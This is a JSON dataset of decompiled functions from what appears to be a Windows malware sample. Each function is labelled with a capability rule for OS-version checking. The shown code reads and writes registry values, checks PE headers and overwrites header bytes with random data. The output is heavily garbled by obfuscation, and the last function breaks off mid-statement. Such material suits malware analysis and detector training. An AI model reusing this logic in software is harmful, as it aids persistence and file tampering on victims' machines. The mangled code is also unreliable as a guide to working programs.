{
    "00401000": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t fcn.00401000(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char extraout_CH;\n    bool bVar3;\n    uint hModule;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x423598 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    bVar3 = extraout_CH - 1U < 5;\n    *0x42359c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x411228);\n    if (!bVar3) {\n        if (bVar3) {\n            out(0xbd, *0x42359c);\n            return *0x42359c;\n        }\n    }\n    *0x4235a0 = (*pcVar1)(iVar2, 0x411238);\n    if (((*0x423598 != 0) && (*0x42359c != 0)) && (*0x4235a0 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 301
    },
    "00401170": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00401170(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.004041c0(0x80000002, 0x4112d0, 0x41131c, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 134
    },
    "00401a80": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ad4) overlaps instruction at (ram,0x00401ad2)\n// \n// WARNING: Removing unreachable block (ram,0x00401b6e)\n\nbool fcn.00401a80(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    ushort in_SS;\n    bool bVar6;\n    uchar str;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    var_4h = 0x104;\n    puVar5 = &var_10bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    do {\n        puVar3 = puVar5 + 2;\n        *puVar5 = uVar2;\n        puVar5 = puVar5 + 3;\n        *puVar3 = uVar2;\n        uVar2 = 0x80000002;\n        iVar4 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x411558, 0x411580, &var_8h, &str, &var_4h);\n        if (iVar4 != 0) {\n            return false;\n        }\n        puVar3 = (*_sym.imp.MSVCRT.dll_strchr)(&str, 0x2e);\n        bVar6 = (POPCOUNT(puVar3 & 0xff) & 1U) == 0;\n        if (puVar3 == NULL) {\n            return false;\n        }\n        if ((bVar6) || (!bVar6)) goto code_r0x00401b4d;\n        puVar1 = segment(in_SS, *0x10 + -0x134);\n        uVar2 = *puVar1;\n    } while (bVar6);\n    puVar3 = uVar2;\n    uVar2 = 0xb7bc9ea5;\ncode_r0x00401b4d:\n    *puVar3 = 0;\n    iVar4 = (*_sym.imp.MSVCRT.dll_atoi)(&str, uVar2);\n    if (iVar4 != 6) {\n        return iVar4 == 7;\n    }\n    return true;\n}\n",
        "token_count": 555
    },
    "00401b90": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c2d) overlaps instruction at (ram,0x00401c2b)\n// \n\nint32_t __cdecl fcn.00401b90(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t extraout_DL;\n    int32_t unaff_EBX;\n    uint *puVar6;\n    uint8_t in_AF;\n    bool bVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    bVar7 = (extraout_DL & 0x66) != 0;\n    var_14h = 0x411538;\n    var_10h = 0x411530;\n    var_ch = 0x411540;\n    var_8h = 0x411548;\n    var_4h = 0x411550;\n    if ((bVar7) && (!bVar7)) {\n        uVar3 = uVar4;\n        if (unaff_EBX + 1 == 0) {\n            uVar3 = (uVar3 | 0x61) + 1;\n            puVar2 = unaff_EBX + -0x2708f73b;\n            bVar7 = CARRY1(*puVar2, uVar3);\n            *puVar2 = *puVar2 + uVar3;\n            goto code_r0x00401c36;\n        }\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        piVar1 = (uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    uVar4 = 0;\n    puVar6 = &var_14h;\n    do {\n        iVar5 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar6);\n        if (iVar5 != 0) {\n            return 1;\n        }\n        uVar4 = uVar4 + 1;\n        puVar6 = puVar6 + 1;\n        bVar7 = uVar4 < 5;\n    } while (bVar7);\n    if ((!bVar7) && (bVar7)) {\n        out(0xbd, 0);\n        return 0;\n    }\n    iVar5 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x411528);\n    bVar7 = iVar5 != 0;\ncode_r0x00401c36:\n    return 1 - bVar7;\n}\n",
        "token_count": 679
    },
    "00402720": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402720(uint arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uchar **ppuVar7;\n    uchar **ppuVar8;\n    uint *puVar9;\n    char *pcVar10;\n    bool bVar11;\n    uchar *apuStack636 [2];\n    uint var_263h;\n    uchar var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = _sym.imp.MSVCRT.dll_sprintf;\n    puVar6 = &stack0xfffffffc;\n    puVar9 = &var_263h;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    var_160h = 0;\n    puVar9 = &var_15fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    bVar11 = arg_ch != 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    ppuVar8 = &stack0xfffffffc;\n    if ((bVar11) && (ppuVar8 = &stack0xfffffffc,  !bVar11)) {\n        ppuVar7 = apuStack636 + 1;\n        ppuVar8 = apuStack636 + 1;\n        apuStack636[1] = &stack0xfffffffc;\n        cVar2 = '\\x10';\n        do {\n            puVar6 = puVar6 + -1;\n            ppuVar7 = ppuVar7 + -1;\n            *ppuVar7 = *puVar6;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    pcVar1 = *(ppuVar8 + 8);\n    (*_sym.imp.MSVCRT.dll_sprintf)(ppuVar8 + -0x160, 0x411184, pcVar1);\n    (*pcVar3)(ppuVar8 + -0x264, 0x41119c, pcVar1);\n    pcVar3 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    *(ppuVar8 + -0x20) = ppuVar8 + -0x160;\n    *(ppuVar8 + -0x18) = ppuVar8 + -0xc;\n    *(ppuVar8 + -0x14) = ppuVar8 + -4;\n    *(ppuVar8 + -0x10) = ppuVar8 + -8;\n    uVar5 = 0xffffffff;\n    pcVar10 = ppuVar8 + -0x160;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar2 = *pcVar10;\n        pcVar10 = pcVar10 + 1;\n    } while (cVar2 != '\\0');\n    *(ppuVar8 + -0x48) = ~uVar5 - 1;\n    uVar5 = 0xffffffff;\n    pcVar10 = pcVar1;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar2 = *pcVar10;\n        pcVar10 = pcVar10 + 1;\n    } while (cVar2 != '\\0');\n    *(ppuVar8 + -0x34) = 0x4111c4;\n    *(ppuVar8 + -0x30) = 0x4111d0;\n    *(ppuVar8 + -0x2c) = 0x4111dc;\n    *(ppuVar8 + -0x28) = 0x4111ec;\n    *(ppuVar8 + -0x24) = 0x4111f4;\n    *(ppuVar8 + -0x5c) = 2;\n    *(ppuVar8 + -0x58) = 1;\n    *(ppuVar8 + -0x54) = 4;\n    *(ppuVar8 + -0x50) = 4;\n    *(ppuVar8 + -0x4c) = 4;\n    *(ppuVar8 + -0x1c) = pcVar1;\n    *(ppuVar8 + -0x44) = ~uVar5 - 1;\n    *(ppuVar8 + -0x40) = 4;\n    *(ppuVar8 + -0x3c) = 4;\n    *(ppuVar8 + -0x38) = 4;\n    if (bVar11 < 5) {\n        uVar5 = bVar11 * 4;\n        do {\n            iVar4 = (*pcVar3)(0x80000002, ppuVar8 + -0x264, *(ppuVar8 + (uVar5 - 0x34)), *(ppuVar8 + (uVar5 - 0x5c)), \n                              *(ppuVar8 + (uVar5 - 0x20)), *(ppuVar8 + (uVar5 - 0x48)));\n            if (iVar4 != 0) {\n                return 0;\n            }\n            uVar5 = uVar5 + 4;\n        } while (uVar5 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1490
    },
    "00402c70": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00402c70(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 120
    },
    "00402fb0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403091) overlaps instruction at (ram,0x00403090)\n// \n\nuint __cdecl fcn.00402fb0(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint extraout_EDX;\n    int32_t unaff_EBX;\n    uint *puVar6;\n    bool bVar7;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    int32_t var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar6 = &var_20fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    s = 0;\n    puVar6 = &var_10bh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    puVar1 = puVar6 + 3;\n    *(puVar6 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x41111c, &lpBuffer, arg_8h);\n    puVar4 = fcn.00404020(&var_4h, &var_8h);\n    bVar7 = puVar1 < puVar4;\n    uVar3 = fcn.004030f0(var_4h);\n    if ((!bVar7) && (bVar7)) {\n        cVar2 = uVar3 - *puVar1;\n        func_0x10189003((in_NT & 1) * 0x4000 | SBORROW1(uVar3, *puVar1) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar2) & 1U) == 0) * 4 | uVar3 < *puVar1 | (in_ID & 1) * 0x200000 |\n                        (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n        var_8h = unaff_EBX + 0x558bf84d;\n        var_4h = extraout_EDX;\n    }\n    iVar5 = fcn.00403c60(&s, var_4h, var_8h);\n    if (iVar5 != 0) {\n        fcn.004014a0(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 825
    },
    "004030f0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031f6) overlaps instruction at (ram,0x004031f1)\n// \n// WARNING: Removing unreachable block (ram,0x00403254)\n\nuint __fastcall fcn.004030f0(uint param_1, int32_t param_2, int16_t *param_3)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint in_EAX;\n    uint32_t *puVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t *unaff_EBX;\n    char *pcVar8;\n    uint *puVar9;\n    int16_t *unaff_ESI;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    bool bVar12;\n    uchar uStack20;\n    ushort uStack19;\n    uchar uStack17;\n    uint uStack8;\n    \n    puVar9 = &stack0xfffffffc;\n    uStack8 = param_1;\n    uStack20 = SUB41(unaff_EDI, 0);\n    uStack19 = unaff_EDI >> 8;\n    uStack17 = unaff_EDI >> 0x18;\n    if ((in_ZF) || (!in_ZF)) {\n        bVar12 = *param_3 == 0x5a4d;\n        puVar9 = &stack0xfffffffc;\n        unaff_ESI = param_3;\ncode_r0x0040311d:\n        if (!bVar12) {\n            return 0;\n        }\n        puVar3 = *(unaff_ESI + 0x1e) + unaff_ESI;\n        uVar7 = *puVar3;\n        bVar12 = *puVar3 == 0x4550;\n        if (!bVar12) {\n            return 0;\n        }\n        if ((!SBORROW4(*puVar3, 0x4550)) && (SBORROW4(*puVar3, 0x4550))) {\n            uVar1 = in(param_2);\n            *unaff_EDI = uVar1;\n            pcVar8 = CONCAT31(unaff_EBX >> 8, 0xbc);\n            if (0x4550 < uVar7) {\n                *pcVar8 = *pcVar8 + (puVar3 >> 8);\n                goto code_r0x004031e8;\n            }\n            goto code_r0x0040318f;\n        }\n        bVar12 = puVar3[0x16] == 0;\n    }\n    else {\n        uVar2 = in(param_2);\n        *unaff_EDI = uVar2;\n        if (0 < &uStack20) {\n            *(unaff_EBX + -0x7e99f78b) = *(unaff_EBX + -0x7e99f78b) ^ param_1;\n            bVar12 = &uStack8 + 3 == NULL;\n            param_2 = CONCAT22(uStack19, CONCAT11(uStack20, uStack17));\n            puVar9 = &uStack8 + 3;\n            unaff_EDI = unaff_EDI + 1;\n            goto code_r0x0040311d;\n        }\n        if (in_CF || *0x10 == 0x15) {\n            *unaff_EBX = *unaff_EBX | unaff_ESI;\n            *(unaff_EDI + 0x62) = *(unaff_EDI + 0x62);\n            return in_EAX;\n        }\n        *(param_2 + 0x56) = *(param_2 + 0x56) + 'v';\n        bVar12 = *(CONCAT31(in_EAX >> 8, 0x8d) + -0x7aa7b775) == unaff_EDI + 1;\ncode_r0x0040318f:\n        puVar9 = *puVar9;\n    }\n    if (!bVar12) {\n        return 0;\n    }\n    puVar9[-1] = 0x40;\n    param_2 = puVar9[2];\n    if (*(param_2 + 0x3c) < 0x81) {\n        return 0;\n    }\ncode_r0x004031e8:\n    if (*(param_2 + 0x3c) < 0xc0) {\n        uVar7 = *(param_2 + 0x3c) - 0x80;\n        puVar9[-1] = uVar7;\n    }\n    else {\n        uVar7 = puVar9[-1];\n    }\n    uStack20 = uVar7 >> 8;\n    uStack19 = uVar7 >> 0x10;\n    puVar4 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    if (puVar4 != NULL) {\n        uVar6 = 0;\n        if (uVar7 != 0) {\n            do {\n                uStack20 = 0x32;\n                uStack19 = 0x40;\n                iVar5 = (*_sym.imp.MSVCRT.dll_rand)();\n                uVar7 = puVar9[-1];\n                uVar10 = uVar6 + 1;\n                *(uVar6 + puVar4) = iVar5 % 0xff;\n                uVar6 = uVar10;\n            } while (uVar10 < uVar7);\n        }\n        puVar11 = puVar4;\n        puVar9 = puVar9[2] + 0x80;\n        for (uVar6 = uVar7 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar9 = *puVar11;\n            puVar11 = puVar11 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        for (uVar7 = uVar7 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n            *puVar9 = *puVar11;\n            puVar11 = puVar11 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        uStack20 = puVar4 >> 8;\n        uStack19 = puVar4 >> 0x10;\n        sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1438
    },
    "004043d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040488f) overlaps instruction at (ram,0x0040488b)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.004043d0(void)\n\n{\n    char *pcVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    char extraout_CL;\n    uint16_t uVar7;\n    uint16_t extraout_CX;\n    ushort extraout_CX_00;\n    ushort extraout_CX_01;\n    int32_t extraout_ECX;\n    uint8_t uVar8;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    char extraout_CH;\n    uint extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint32_t extraout_ECX_06;\n    uint extraout_ECX_07;\n    uint extraout_ECX_08;\n    uint extraout_ECX_09;\n    char extraout_DH;\n    uint extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint16_t uVar9;\n    uint32_t unaff_EBX;\n    uint32_t uVar10;\n    uint uVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    int32_t *unaff_ESI;\n    uint32_t uVar16;\n    int16_t iVar17;\n    int32_t *unaff_EDI;\n    uint uVar18;\n    uchar uVar19;\n    bool bVar20;\n    char cVar21;\n    bool bVar22;\n    uchar uVar23;\n    char cVar24;\n    ulong uVar25;\n    unkbyte6 Var26;\n    int32_t *piVar27;\n    int32_t *arg_14h;\n    uint uVar28;\n    \n    fcn.00401380(0x407010, 0x14, 0x41111c, 10);\n    iVar3 = fcn.00401380(0x407010, 0x14, 0x411128, 0x12);\n    iVar3 = extraout_ECX - iVar3;\n    while( true ) {\n        uVar7 = iVar3 & 0xff00 | iVar3 ^ iVar3 >> 8 | 0x3d00 | unaff_EBX;\n        uVar6 = uVar7;\n        uVar8 = uVar7 >> 8;\n        uVar19 = uVar8 < uVar6;\n        cVar21 = uVar8 == uVar6;\n        puVar4 = fcn.00401380(0x407010, 0x14, 0x41113c, 4);\n        if ((uVar19) || (!uVar19)) break;\n        iVar3 = extraout_ECX_00;\n        if (&stack0xffffffe4 < *puVar4 || puVar4 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    do {\n        uVar28 = 0x14;\n        fcn.00401380(0x407010, 0x14, 0x411140, 0x407010);\n        if ((uVar19) || (!uVar19)) goto code_r0x004044b1;\n    } while (extraout_ECX_01 != 1 && cVar21 != '\\0');\n    *unaff_EDI = unaff_ESI + 1;\n    unaff_ESI = 0x6ab8ec44;\ncode_r0x004044b1:\n    arg_14h = 0x14;\n    piVar27 = 0x407010;\n    fcn.00401380(0x407010, 0x14, 0x41114c, uVar28);\n    bVar20 = (POPCOUNT(extraout_DH - extraout_CL) & 1U) == 0;\n    uVar25 = fcn.00401380(0x407010, 0x14, 0x411154, 0xb);\n    if ((!bVar20) && (bVar20)) {\n        puVar4 = (uVar25 >> 0x20) + 0xc;\n        uVar10 = *puVar4;\n        *puVar4 = *puVar4 - 0x68;\n        *extraout_ECX_02 = *extraout_ECX_02 + uVar25 + (uVar10 < 0x68);\n        piVar27 = unaff_EDI;\n        arg_14h = unaff_ESI;\n    }\n    fcn.00401380(0x407010, 0x14, piVar27, arg_14h);\n    fcn.00401380(0x407010, 0x14, 0x41116c, 8);\n    fcn.00401380(0x407010, 0x14, 0x411174, 0xd);\n    bVar20 = false;\n    bVar22 = (unaff_ESI & extraout_CX) == 0;\n    uVar25 = fcn.00401380(0x407010, 0x14, 0x411184, 0x18);\n    puVar14 = uVar25;\n    if (!bVar20 && !bVar22) {\n        unaff_EBX = unaff_EBX & 0xffff00ff;\n    }\n    piVar27 = unaff_ESI + 1;\n    *unaff_EDI = *unaff_ESI;\n    uVar9 = CONCAT11(0xdf, unaff_EBX);\n    pcVar1 = (uVar25 >> 0x20) + 0x14;\n    *pcVar1 = *pcVar1 + extraout_CH;\n    puVar14[-1] = 0x407010;\n    puVar14[-2] = 0x404597;\n    fcn.00401380(puVar14[-1], *puVar14, puVar14[1], puVar14[2]);\n    puVar14[6] = extraout_EDX;\n    puVar14[5] = unaff_EDI + 1;\n    iVar3 = puVar14[5];\n    puVar14[6] = 10;\n    puVar14[5] = 0x4111c4;\n    puVar14[4] = 0x14;\n    puVar14[3] = 0x407010;\n    puVar14[2] = 0x4045cb;\n    uVar28 = fcn.00401380(puVar14[3], puVar14[4], puVar14[5], puVar14[6]);\n    puVar14[6] = uVar28;\n    cVar24 = '\\0';\n    uVar7 = uVar28 ^ uVar9;\n    cVar21 = uVar7 < 0;\n    bVar20 = uVar7 == 0;\n    puVar14[6] = 0xc;\n    puVar14[5] = 0x4111d0;\n    puVar14[4] = 0x14;\n    puVar12 = puVar14 + 3;\n    puVar14[3] = 0x407010;\n    puVar14[2] = 0x4045e6;\n    fcn.00401380(puVar14[3], puVar14[4], puVar14[5], puVar14[6]);\n    if (!bVar20 && cVar24 == cVar21) {\n        *(puVar14 + 10) = piVar27;\n        piVar27 = piVar27 & 0xffff0000 | *(puVar14 + 10);\n    }\n    puVar14[2] = 0xd;\n    puVar14[1] = 0x4111dc;\n    *puVar14 = 0x14;\n    puVar14[-1] = 0x407010;\n    puVar14[-2] = 0x404605;\n    uVar28 = fcn.00401380(puVar14[-1], *puVar14, puVar14[1], puVar14[2]);\n    puVar14[6] = uVar28;\n    puVar14[5] = extraout_ECX_03;\n    uVar19 = false;\n    bVar20 = (CONCAT11((uVar28 >> 8) - extraout_ECX_03, uVar28 + '\\x01') - 1U & 0x637b) == 0;\n    puVar14[6] = 6;\n    puVar14[5] = 0x4111ec;\n    puVar14[4] = 0x14;\n    puVar14[3] = 0x407010;\n    puVar14[2] = 0x404635;\n    fcn.00401380(puVar14[3], puVar14[4], puVar14[5], puVar14[6]);\n    if (!uVar19 && !bVar20) {\n        puVar14[2] = piVar27;\n        piVar27 = puVar14[2];\n        if (uVar19 || bVar20) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    puVar14[2] = 5;\n    puVar14[1] = 0x4111f4;\n    *puVar14 = 0x14;\n    puVar14[-1] = 0x407010;\n    puVar14[-2] = 0x404652;\n    fcn.00401380(puVar14[-1], *puVar14, puVar14[1], puVar14[2]);\n    uVar10 = unaff_EBX & 0xffff0000 | uVar9;\n    puVar14[-2] = 0xd;\n    puVar14[-3] = 0x4111fc;\n    puVar14[-4] = 0x14;\n    puVar14[-5] = 0x407010;\n    puVar14[-6] = 0x404677;\n    fcn.00401380(puVar14[-5], puVar14[-4], puVar14[-3], puVar14[-2]);\n    if ((!uVar19) && (uVar19)) {\n        uVar10 = uVar10 + *(uVar10 + 0x69 + extraout_EDX_00 * 4) + uVar19;\n    }\n    puVar14[-6] = 0x19;\n    puVar14[-7] = 0x41120c;\n    puVar14[-8] = 0x14;\n    puVar14[-9] = 0x407010;\n    puVar14[-10] = 0x4046a1;\n    iVar5 = fcn.00401380(puVar14[-9], puVar14[-8], puVar14[-7], puVar14[-6]);\n    puVar14[6] = iVar5;\n    puVar14[5] = iVar3;\n    puVar14[4] = piVar27;\n    bVar20 = SBORROW4(iVar3, iVar5);\n    uVar16 = puVar14[4];\n    uVar28 = puVar14[5];\n    puVar14[6] = 0xf;\n    puVar14[5] = 0x411228;\n    puVar14[4] = 0x14;\n    puVar14[3] = 0x407010;\n    puVar14[2] = 0x4046c1;\n    fcn.00401380(puVar14[3], puVar14[4], puVar14[5], puVar14[6]);\n    if ((bVar20) || (!bVar20)) {\n        puVar12 = puVar14 + 2;\n        puVar14[2] = 0xe;\n    }\n    uVar19 = 0;\n    bVar20 = (POPCOUNT(extraout_ECX_04 & *(extraout_ECX_04 + 0x87cb1757) & 0xff) & 1U) == 0;\n    puVar12[-1] = 0x411238;\n    puVar12[-2] = 0x14;\n    puVar12[-3] = 0x407010;\n    puVar12[-4] = 0x4046eb;\n    fcn.00401380(puVar12[-3], puVar12[-2], puVar12[-1], *puVar12);\n    if ((!bVar20) && (bVar20)) {\n        puVar14 = puVar12 + -4;\n        puVar12[-4] = 0x6ae181d0;\n        puVar15 = 0x6ae181d0;\n        cVar21 = '\\x1e';\n        do {\n            puVar15 = puVar15 + -1;\n            puVar14 = puVar14 + -1;\n            *puVar14 = *puVar15;\n            cVar21 = cVar21 + -1;\n        } while ('\\0' < cVar21);\n        puVar12[-0x23] = puVar12 + -4;\n        uVar28 = in(0x78);\n        return uVar28;\n    }\n    puVar12[-4] = 0xb;\n    puVar12[-5] = 0x411248;\n    puVar12[-6] = 0x14;\n    puVar13 = puVar12 + -7;\n    puVar12[-7] = 0x407010;\n    puVar12[-8] = 0x40471a;\n    fcn.00401380(puVar12[-7], puVar12[-6], puVar12[-5], puVar12[-4]);\n    if ((uVar19) || (!uVar19)) {\n        puVar13 = puVar12 + -8;\n        puVar12[-8] = 0xb;\n    }\n    puVar13[-1] = 0x411254;\n    puVar13[-2] = 0x14;\n    puVar13[-3] = 0x407010;\n    puVar13[-4] = 0x404744;\n    uVar2 = fcn.00401380(puVar13[-3], puVar13[-2], puVar13[-1], *puVar13);\n    *(puVar13 + 0x32) = uVar2;\n    *(puVar13 + 0xc) = extraout_CX_00;\n    puVar13[0xb] = uVar28;\n    uVar18 = puVar13[0xb];\n    puVar13[0xc] = 0xb;\n    puVar13[0xb] = 0x411260;\n    puVar13[10] = 0x14;\n    puVar13[9] = 0x407010;\n    puVar13[8] = 0x404774;\n    fcn.00401380(puVar13[9], puVar13[10], puVar13[0xb], puVar13[0xc]);\n    puVar13[0xc] = extraout_ECX_05;\n    puVar13[0xc] = 10;\n    puVar13[0xb] = 0x41126c;\n    puVar13[10] = 0x14;\n    puVar13[9] = 0x407010;\n    puVar13[8] = 0x40479f;\n    Var26 = fcn.00401380(puVar13[9], puVar13[10], puVar13[0xb], puVar13[0xc]);\n    *(puVar13 + 0x32) = uVar10;\n    *(puVar13 + 0xc) = Var26 >> 0x20;\n    puVar13[0xb] = Var26;\n    uVar7 = *(puVar13 + 0x32);\n    puVar13[0xc] = 0xc;\n    puVar13[0xb] = 0x411278;\n    puVar13[10] = 0x14;\n    puVar13[9] = 0x407010;\n    puVar13[8] = 0x4047d7;\n    uVar2 = fcn.00401380(puVar13[9], puVar13[10], puVar13[0xb], puVar13[0xc]);\n    puVar13[0xc] = uVar10 & 0xffff0000 | uVar7;\n    *(puVar13 + 0x2e) = uVar2;\n    uVar11 = puVar13[0xc];\n    puVar13[0xc] = 0xe;\n    puVar13[0xb] = 0x411284;\n    puVar13[10] = 0x14;\n    puVar13[9] = 0x407010;\n    puVar13[8] = 0x40480c;\n    uVar28 = fcn.00401380(puVar13[9], puVar13[10], puVar13[0xb], puVar13[0xc]);\n    puVar13[0xc] = uVar28;\n    puVar13[0xb] = uVar18;\n    cVar24 = '\\0';\n    iVar17 = uVar18;\n    cVar21 = iVar17 < 0;\n    bVar20 = iVar17 == 0;\n    uVar28 = puVar13[0xb];\n    puVar13[0xc] = 0x11;\n    puVar13[0xb] = 0x411294;\n    puVar13[10] = 0x14;\n    puVar13[9] = 0x407010;\n    puVar13[8] = 0x404843;\n    fcn.00401380(puVar13[9], puVar13[10], puVar13[0xb], puVar13[0xc]);\n    if (!bVar20 && cVar24 == cVar21) {\n        *(puVar13 + 0x22) = uVar16;\n        uVar16 = uVar16 & 0xffff0000 | *(puVar13 + 0x22);\n    }\n    puVar13[8] = 0x13;\n    puVar13[7] = 0x4112a8;\n    puVar13[6] = 0x14;\n    puVar13[5] = 0x407010;\n    puVar13[4] = 0x404862;\n    